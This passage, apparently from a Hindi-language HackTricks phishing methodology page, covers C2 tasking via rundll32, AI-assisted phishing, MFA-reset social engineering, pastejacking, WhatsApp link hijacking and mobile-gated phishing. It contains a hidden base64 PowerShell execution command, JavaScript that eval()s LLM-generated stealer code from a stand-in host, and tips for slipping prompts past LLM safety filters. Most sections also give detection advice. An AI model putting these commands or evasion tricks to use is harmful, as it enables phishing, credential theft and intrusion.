  * `Invoke-WebRequest` payload को `%TEMP%` में डालता है, एक छोटा sleep network jitter को छिपाता है, फिर `rundll32` exported entrypoint (`notepad`) को कॉल करता है।
* DLL host identity beacon करता है और हर कुछ मिनट में C2 को poll करता है। Remote tasking **base64-encoded PowerShell** के रूप में आता है, जिसे hidden और policy bypass के साथ execute किया जाता है:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * इससे C2 flexibility बनी रहती है (server, DLL को अपडेट किए बिना tasks बदल सकता है) और console windows छिपी रहती हैं। `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` का एक साथ इस्तेमाल करने वाली `rundll32.exe` की PowerShell child processes की तलाश करें।
* Defenders, `...page.php?tynor=<COMPUTER>sss<USER>` के रूप में HTTP(S) callbacks और DLL load होने के बाद 5-minute polling intervals की तलाश कर सकते हैं।

---

## AI-संवर्धित Phishing Operations
Attacker अब पूरी तरह personalised lures और real-time interaction के लिए **LLM और voice-clone APIs** को chain करते हैं।

| Layer | Threat actor द्वारा उपयोग का उदाहरण |
|-------|-----------------------------|
|Automation|Randomised wording और tracking links के साथ >100 k emails / SMS generate और send करना।|
|Generative AI|Public M&A का संदर्भ देने वाले *one-off* emails और social media के अंदरूनी मज़ाक तैयार करना; callback scam में CEO की deep-fake आवाज़।|
|Agentic AI|स्वायत्त रूप से domains register करना, open-source intel scrape करना और victim के click करने पर—लेकिन creds submit न करने पर—अगले चरण के mails तैयार करना।|

**Defence:**  
• Untrusted automation से भेजे गए messages को highlight करने वाले **dynamic banners** जोड़ें (ARC/DKIM anomalies के ज़रिए)।  
• High-risk phone requests के लिए **voice-biometric challenge phrases** लागू करें।  
• Awareness programmes में AI-generated lures का लगातार simulation करें – static templates अब पुराने पड़ चुके हैं।

Credential phishing के लिए agentic browsing abuse भी देखें:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory और detection के लिए local CLI tools और MCP के AI agent abuse को भी देखें:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Phishing JavaScript की LLM-assisted runtime assembly (in-browser codegen)

Attackers भरोसेमंद दिखने वाला HTML भेजकर और फिर **trusted LLM API** से JavaScript generate करवाकर stealer को **runtime पर generate** कर सकते हैं, और फिर उसे browser में execute कर सकते हैं (जैसे, `eval` या dynamic `<script>`)।<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** exfil URLs/Base64 strings को prompt में encode करें; safety filters को bypass करने और hallucinations कम करने के लिए wording में बदलाव करते रहें।
2. **Client-side API call:** load होने पर, JS किसी public LLM (Gemini/DeepSeek/etc.) या CDN proxy को call करता है; static HTML में सिर्फ prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करके execute करें (हर visit पर polymorphic):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** generated code lure को व्यक्तिगत बनाता है (जैसे, LogoKit token parsing) और creds को prompt-hidden endpoint पर भेजता है।

**Evasion traits**
- Traffic well-known LLM domains या reputable CDN proxies तक पहुँचता है; कभी-कभी backend तक WebSockets के ज़रिए।
- कोई static payload नहीं; malicious JS केवल render के बाद मौजूद होता है।
- Non-deterministic generations से हर session के लिए **unique** stealers बनते हैं।

**Detection ideas**
- JS enabled वाले sandboxes चलाएँ; LLM responses से आए **runtime `eval`/dynamic script creation** को flag करें।
- LLM APIs को किए गए front-end POSTs के तुरंत बाद लौटाए गए text पर `eval`/`Function` चलने की तलाश करें।
- Client traffic में unsanctioned LLM domains और उसके बाद होने वाले credential POSTs पर alert करें।

---

## MFA Fatigue / Push Bombing का रूप – ज़बरन रीसेट
Classic push-bombing के अलावा, operators help-desk call के दौरान बस **नया MFA registration ज़बरन करवाते हैं**, जिससे user का मौजूदा token बेकार हो जाता है। इसके बाद आने वाला कोई भी login prompt victim को legitimate दिखाई देता है।

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta events पर नज़र रखें, जहाँ **`deleteMFA` + `addMFA`** कुछ ही मिनटों के भीतर एक ही IP से किए गए हों।



## Clipboard Hijacking / Pastejacking

हमलावर किसी compromised या typosquatted वेब पेज से चुपचाप पीड़ित के clipboard में malicious commands कॉपी कर सकते हैं। फिर वे उपयोगकर्ता को उन्हें **Win + R**, **Win + X** या किसी terminal window में paste करने के लिए बहका सकते हैं, जिससे बिना कोई download या attachment के arbitrary code execute हो जाता है।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* एक lure page (जैसे, किसी मंत्रालय/CERT का नकली “channel”) WhatsApp Web/Desktop QR दिखाता है और पीड़ित को उसे scan करने का निर्देश देता है। इससे हमलावर चुपचाप एक **linked device** के रूप में जुड़ जाता है।<sup>[[12]](#references)</sup>
* हमलावर को session हटाए जाने तक chats और contacts दिखाई देते रहते हैं। पीड़ितों को बाद में “new device linked” notification दिख सकता है; defenders, untrusted QR pages पर जाने के तुरंत बाद होने वाले unexpected device-link events की तलाश कर सकते हैं।

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators अपने phishing flows को increasingly एक साधारण device check के पीछे रखते हैं, ताकि desktop crawlers अंतिम pages तक न पहुँच सकें। एक आम तरीका यह है कि एक छोटा script touch-capable DOM की जाँच करता है और परिणाम को server endpoint पर भेजता है; non‑mobile clients को HTTP 500 (या एक blank page) मिलता है, जबकि mobile users को पूरा flow दिखाया जाता है।<sup>[[7]](#references)</sup>

न्यूनतम client snippet (आम logic):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` लॉजिक (सरलीकृत):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

अक्सर देखा जाने वाला सर्वर व्यवहार:
- पहले लोड के दौरान session cookie सेट करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
- `is_mobile=false` होने पर बाद के GET अनुरोधों के लिए 500 (या placeholder) लौटाता है; phishing content केवल `true` होने पर दिखाता है।

Hunting और detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non-mobile के लिए HTTP 500 का क्रम; वैध mobile victim paths में 200 के साथ आगे HTML/JS लौटता है।
- उन pages को block करें या उनकी जाँच करें जो content को केवल `ontouchstart` या इसी तरह की device checks के आधार पर दिखाते हैं।

बचाव के सुझाव:
- gated content को सामने लाने के लिए crawlers को mobile-जैसे fingerprints और JS enabled के साथ चलाएँ।
- नए registered domains पर `POST /detect` के बाद आने वाले संदिग्ध 500 responses पर alert करें।

## References

- [1] [Phishing में इस्तेमाल होने वाले Domain Variations बनाना (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing ढूँढ़ना: Tools और Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC का इस्तेमाल करके Credentials चुराना और 2FA को Bypass करना (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC के साथ Sessions चुराना और 2FA को Bypass करना (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy पर Postfix के साथ DKIM कैसे Install और Configure करें (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering संस्करण](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infrastructure और heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks की अगली सीमा: Real Time में Phishing JavaScript बनाने के लिए LLMs का उपयोग](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking और TDS: Malware Distribution Ecosystem के भीतर](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com को Bitsquat करना (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping से Microsoft के windows.com पर Traffic Hijack करना (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [प्यार? असल में: पाकिस्तान में Targeted Spyware Campaign के लिए Lure के तौर पर इस्तेमाल किया गया Fake Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs और Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
